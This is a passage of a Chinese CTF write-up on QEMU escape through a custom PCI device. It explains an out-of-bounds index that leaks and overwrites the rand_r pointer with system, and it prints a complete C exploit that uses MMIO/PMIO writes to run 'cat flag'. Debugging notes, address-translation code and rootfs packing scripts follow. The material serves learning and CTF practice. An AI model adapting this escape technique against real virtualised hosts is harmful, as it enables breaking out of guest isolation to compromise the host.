src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820215.png" alt="image-20230316150429029" style="zoom:50%;" /><p>这里的 <code>v4</code> 来自于 <code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code></p><p><code>seek</code> 和 <code>addr</code> 都可控，也就意味着 <code>v4</code> 可控。这样我们就可以通过索引溢出来控制 <code>rand_r</code> 函数指针（如下），在 <code>d3dev_pmio_write</code> 函数中，调用了 <code>rand_r</code> 函数，如果将 <code>rand_r</code> 改成 <code>system</code> 函数，则可以触发后门。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821297.png" alt="image-20230316151852507"></p><p>需要注意的是如果使用 <code>seek</code> 默认为 <code>0</code> ，那么<code>addr</code> 需要为 <code>0x818</code> 。但是 <code>MMIO</code> 区域为 <code>0x800</code> ，因此使用 <code>0x818</code> 的话 <code>PCI</code> 设备在内部会检查到这里发生了越界（如下）。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821884.png" alt="image-20230316152939181" style="zoom:50%;" /><p>所以这里还需要控制 <code>seek</code> 为 <code>0x100</code> ，控制 <code>addr</code> 为 <code>0x18</code> , 才能让 <code>blocks[v4]</code> 正好落在 <code>rand_r</code> 的位置。</p><h4 id="泄露地址">泄露地址</h4><p>因为本题开了 <code>PIE</code> ，即使程序中给了 <code>system</code> 函数，依然需要泄露程序的基地址。</p><p>泄露地址这里涉及一个 <code>tea</code> 加解密</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821914.png" alt="image-20230316153307989"></p><p>这里是可以越界读取 <code>rand_r</code> 的地址，但是读取的结果会放到 <code>v5</code> ，经过了 <code>tea</code> 加密后，最终 <code>return</code> 将其返回，此处的 <code>key[0] key[1] key[2] key[3]</code> 在 <code>d3dev_pmio_write</code> 函数中都可以被设置为 <code>0</code> （如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819077.png" alt="image-20230316154127664" style="zoom:50%;" /><p>因此最后的解密脚本应该如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样将接收到的密文用这个函数解密，即可得到 <code>rand_r</code> 函数的地址。</p><p>用 <code>mmio_write</code> 函数写入 <code>system</code> 地址的时候，需要先加密后写入，不然只能写入四个字节。</p><p>最后控制参数的话，假设我们想执行 <code>cat flag</code> 这个命令，那么需要把 <code>r_seed</code> 设置为 <code>cat </code>，因为 <code>r_seed</code> 的大小就为四字节，所以只能存放 <code>cat </code>，而 <code>r_seed</code> 下面的数据就是 <code>blocks</code> ,所以在 <code>blocks[0]</code> 的位置存放字符串 <code>flag</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821106.png" alt="image-20230316160923121"></p><p>执行 <code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code> 命令，获取 <code>0xfebf1000</code> 为 <code>MMIO</code> 基地址，<code>0xc040</code>  为 <code>PMIO</code> 基地址</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819207.png" alt="image-20230316161803354" style="zoom:50%;" /><h4 id="EXP-v3">EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc040</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)(mmio_mem+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v[<span class="number">1</span>] -= ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">0</span>] -= ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        i += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    getchar();</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);<span class="comment">//set the key to 0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);<span class="comment">//set the seek to 0x100 to prevent addr from overflow the MMIO area</span></span><br><span class="line">    <span class="type">uint64_t</span> rand_r=mmio_read(<span class="number">0x18</span>);<span class="comment">//get address after the tea encode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address before decode is @%lx\n&quot;</span>,rand_r);</span><br><span class="line">    decode(&amp;rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address after decode is @%llx\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> sys_addr=rand_r+<span class="number">0xa5e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system address is @%llx\n&quot;</span>,sys_addr);</span><br><span class="line">    encode(&amp;sys_addr);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,sys_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> args=<span class="number">0x67616c66</span>;</span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);<span class="comment">//set the seek to 0</span></span><br><span class="line">    encode(&amp;args);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,args);  <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">0x1C</span>, <span class="number">0x20746163</span>);  <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821302.png" alt="image-20230316162420666" style="zoom: 67%;" /><h2 id="奇奇怪怪的技能">奇奇怪怪的技能</h2><h3 id="调试">调试</h3><p>执行 <code>launch.sh</code> 脚本，将 <code>qemu</code> 启动起来，然后用 <code>ps -a | grep qemu</code> 来查看 <code>qemu</code> 的进程号，接着 <code>sudo gdb qemu-system-x86_64</code>  来开 <code>gdb</code> ，再输入 <code>attach pid</code>  附加进程开始调试（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261609688.png" alt="image-20230226160922771"></p><p>假设我们现在想从 <code>qemu-system</code> 中的 <code>vn_mmio_read</code> 函数这里开始调试，那么我们下该函数的断点（本题的 <code>qemu-system</code> 并没有开 <code>PIE</code> ，所以直接下断点即可，如果开 <code>PIE</code> 的话别忘记加基地址），并在 <code>qemu</code> 中运行 <code>exp</code> （如下），从而来调试查看我们关注的信息</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261610355.png" alt="image-20230226161041668"></p><h3 id="qemu中的虚拟内存与物理内存">qemu中的虚拟内存与物理内存</h3><p>在这之前要先明白两点，第一点是客户机 指的是运行在虚拟机中的操作系统及其应用程序。而宿主机 则指的是运行虚拟机的物理机 。第二，<code>qemu</code> 跑在宿主机里，本质上就是一个进程，和其他进程没有任何区别</p><p>所以接下来有四个地址，分别是 客户机的物理地址，客户机的虚拟地址，宿主机的物理地址，宿主机的虚拟地址</p><ul><li><p>宿主机的物理地址：指的是物理内存条上的地址，即硬件直接访问的物理地址。</p></li><li><p>宿主机的虚拟地址：操作系统所呈现给我们的虚假地址，它们被用来访问宿主机上的进程</p></li><li><p>客户机的物理地址：由 <code>qemu</code> 程序执行了 <code>mmap</code> 函数，映射了一片内存空间出来，作为客户机的物理地址</p></li><li><p>客户机的虚拟地址：客户机里的操作系统将刚刚映射出来的那片内存空间经过转换，呈现给我们了一个虚假地址</p></li></ul><p>此时如果再去仔细分析下面这个图 （来自 <a href="https://bbs.kanxue.com/thread-265501.htm">https://bbs.kanxue.com/thread-265501.htm</a> ）  的话，就大概能体会到这些地址直接的关系了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                       Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+                                    （GVA）</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |            （GPA）</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |         （HVA）</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||    （HPA）</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><h4 id="虚拟地址转换物理地址的过程">虚拟地址转换物理地址的过程</h4><p>然后简单说一下将虚拟地址转换为物理地址的思路</p><p>每个进程都有自己的页表（存储在 <code>/proc/self/pagemap</code> 文件中），页表由一个或多个页表项组成，每个页表项记录了一个虚拟页到物理页的映射关系，在 <code>64</code> 位 <code>Linux</code> 系统中，页表项为 <code>64</code> 位。</p><p>现在给出一个虚拟地址，将其右移 <code>9</code> 位的话，得到的是页表项偏移量（页表项在页表中的偏移）,这里 <code>&amp; ~7</code> 是将页表项偏移量向下对齐到8字节边界上（因为页表项是八字节，这里是要八字节对齐）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = (addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span></span><br></pre></td></tr></table></figure><p>得到页表项偏移量之后，我们就可以去用 <code>lseek</code> 和 <code>read</code> 函数从 <code>pagemap</code> 文件中读取一个页表项的信息，读取出来的信息包括：</p><ul><li><p>bit 0-54 存储物理页帧号</p></li><li><p>bit 55-62 为保留位</p></li><li><p>bit 63 存储页面是否存在</p><p>如果存储页面存在的话，那我们就读取它的物理页帧号，最终要获取物理的地址的话，需要物理页帧号和页面内偏移量（虚拟地址将其右移 <code>12</code> 位），因此我们最后的物理地址是将物理页帧号左移 <code>12</code> 位，将其或（ <code>|</code> ）上页面内偏移量，即可得到物理地址。</p></li></ul><h4 id="程序验证">程序验证</h4><p>用网上其他师傅的一个程序来验证一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="comment">// 获取页内偏移</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// addr &amp; 0xfff</span></span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pfn_item_offset : %p\n&quot;</span>, (<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>);</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;<span class="comment">//得到的是页表项偏移量</span></span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);<span class="comment">//读取一个页表项的信息</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))<span class="comment">// 确保页面存在——page is present.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// physical frame number</span></span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;<span class="comment">//返回物理页帧号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);<span class="comment">//通过物理页帧号和页内偏移量来得到物理地址</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual address %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"> </span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其编译后放入 <code>qemu</code> 中，调试一下。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051312873.png" alt="image-20230305131217704"></p><p>因为启 <code>qemu</code> 的时候，给的是 <code>64M</code> 的内存，所以我们去找这个 <code>0x4000000</code>  的起始内存地址，发现是 <code>0x7fc254c00000</code> ，然后用这个地址加上物理内存，就能找到字符串 <code>Where am I?</code></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051350957.png" alt="image-20230305135007883"></p><p>如果我们希望本地调试脚本，那么肯定是需要将 <code>exp</code> 文件放入到 <code>qemu</code> 中的，这里的通用方法是本地先将文件系统解包，然后把 <code>exp.c</code> 放进去，再打包即可，具体方法如下</p><h3 id="解包和打包脚本">解包和打包脚本</h3><h4 id="对-cpio-文件的打包和解包">对 <code>cpio</code> 文件的打包和解包</h4><p>解包脚本（如果缺少 <code>unar</code> 的话，请自行安装） 转自 <a href="https://www.jianshu.com/p/f08e34cf08ad">https://www.jianshu.com/p/f08e34cf08ad</a>  如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">mv $1 $1.gz</span><br><span class="line">unar $1.gz</span><br><span class="line">mv $1 core</span><br><span class="line">mv $1.gz $1</span><br><span class="line">echo &quot;[+]Successful&quot;</span><br></pre></td></tr></table></figure><p>打包脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1 </span><br><span class="line">mv $1 ..</span><br></pre></td></tr></table></figure><p>将这两个脚本都放置到 <code>/usr/local/bin</code> 目录下，将解包脚本命名为 <code>hen</code>  打包脚本命名为 <code>gen</code></p><p><strong>最后别忘记给它们可执行权限</strong></p><h5 id="使用方法：">使用方法：</h5><p>使用 <code>hen rootfs.cpio</code> 命令会在当前目录生成一个 <code>core</code> 文件夹，然后 <code>cd core</code> ，将准备编译好的 <code>exp</code> 文件复制进来。然后在 <code>core</code> 目录执行 <code>gen rootfs.cpio</code> 命令即可（注意，解包命令是在 <code>core</code> 文件的上一级使用的，打包命令是在 <code>core</code> 文件中使用的）</p><p>最后重新运行 <code>launch.sh</code> ，进入到 <code>qemu</code> 中后，就可以看到 <code>exp</code> 文件了。</p><h4 id="对-img-文件的打包和解包">对 <code>img</code> 文件的打包和解包</h4><p>如果是 <code>rootfs.img</code> 文件的话，就创建一个 <code>rootfs</code> 文件夹，然后将 <code>rootfs.img</code> 文件复制进去，执行命令 <code>cpio -ivmd &lt; rootfs.img </code> ，解包后，将 <code>exp</code> 复制到 <code>rootfs</code> 文件夹中，然后执行命令（在 <code>rootfs</code> 文件中执行） <code>find . | cpio -o -H newc | gzip -9  &gt; ../rootfs.img </code> 即可将 <code>exp</code> 打包进去。</p><h3 id="musl-gcc-的编译与环境变量的配置">musl-gcc 的编译与环境变量的配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.musl-libc.org/releases/musl-latest.tar.gz</span><br><span class="line">tar zxvf musl-latest.tar.gz</span><br></pre></td></tr></table></figure><p>然后 <code>cd</code> 进入解压之后的目录，执行下面的命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>注意命令执行的权限</p><p>接下来，如果你能用绝对路径来执行 <code>musl-gcc</code> 那就说明安装的没问题，然后来配置环境变量</p><p>如果你和我一样使用的是 <code>zsh shell</code> （在命令行中输入 <code>echo $0</code> 可以进行确认），那么应该将环境变量设置添加到 <code>~/.zshrc</code> 文件中</p><p>将下面的命令添加到 <code>~/.zshrc</code> 文件的末尾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -d &quot;/usr/local/musl/bin&quot; ] ; then</span><br><span class="line">    PATH=&quot;/usr/local/musl/bin:$PATH&quot;</span><br><span class="line">fi</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure><p>然后使用下面的命令，重新加载 <code>.zshrc</code> 文件即可（此时输入 <code>musl-gcc</code> 就可以正常使用了）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><h4 id="缺少库-报错解决">缺少库 报错解决</h4><p>最开始在 <code>ubuntu 18.04</code> 上运行发现缺少库，然后 <code>ldd</code> 看了一下（情况如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821585.png" alt="image-20230313230807235"></p><p>这应该是 <code>libc</code> 版本太低导致的，于是我就改用了 <code>22.04</code></p><p>此时的报错如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821453.png" alt="image-20230313231108491"></p><p>然后 <code>winmt</code> 师傅教我的解决思路是 <code>apt search xxx</code> 来搜索缺少的库， <code>xxx</code> 则是 <code>so</code> 前面的数据，也就是 <code>libbrlapi</code>（效果如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822783.png" alt="image-20230313231250902" style="zoom: 67%;" /><p>然后我是把这几个库全给安装了 ，命令是 <code>sudo apt install xxx</code></p><p>不过发现依然是这个报错，于是执行命令 <code>find /usr/lib -name &quot;libbrlapi*&quot;</code> 效果如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161822719.png" alt="image-20230313231502355" style="zoom:67%;" /><p>可以发现，现在的 <code>/usr/lib</code> 目录下是安装了 <code>/usr/lib/x86_64-linux-gnu/libbrlapi.so.0.8</code> ，但是这个 <code>qemu-system-x86_64</code> 需要的是 <code>libbrlapi.so.0.7</code> ，于是按照 <code>winmt</code> 师傅所说，创建了一个名字叫做 <code>libbrlapi.so.0.7</code> 的软链接，命令是 <code>sudo ln -s libbrlapi.so.0.8 libbrlapi.so.0.7</code> ，最终问题解决，可以成功启动 <code>qemu</code>。</p><p><strong>总结：</strong> 遇见这种少库的思路就是先 <code>apt search</code> 看一下少的库，然后少哪个安哪个即可，如果安装之后还少库，那么可能是按照的版本不对，创建一个软链接即可</p><h2 id="参考文章">参考文章</h2><p><a href="https://www.jianshu.com/p/f08e34cf08ad">qemu逃逸学习笔记 - 简书 (jianshu.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-265501.htm#msg_header_h2_6">原创]QEMU逃逸初探-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#pci%E8%AE%BE%E5%A4%87%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4">qemu-pwn-基础知识 « 平凡路上 (ray-cp.github.io)</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/127332351">(45条消息) qemu逃逸小识_mmio_write_xyzmpv的博客-CSDN博客</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">QEMU 逃逸 潦草笔记 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p><p><a href="https://zhuanlan.zhihu.com/p/588124131">QEMU逃逸系列 - 知乎 (zhihu.com)</a></p><p><a href="https://www.anquanke.com/post/id/254906">QEMU逃逸初探（一）-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://cyyyber.icu/2022/01/20/%E4%BB%8E%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E5%AD%A6%E4%B9%A0QEMU%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://cyyyber.icu/2022/01/20/从一道例题学习QEMU逃逸原理/</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
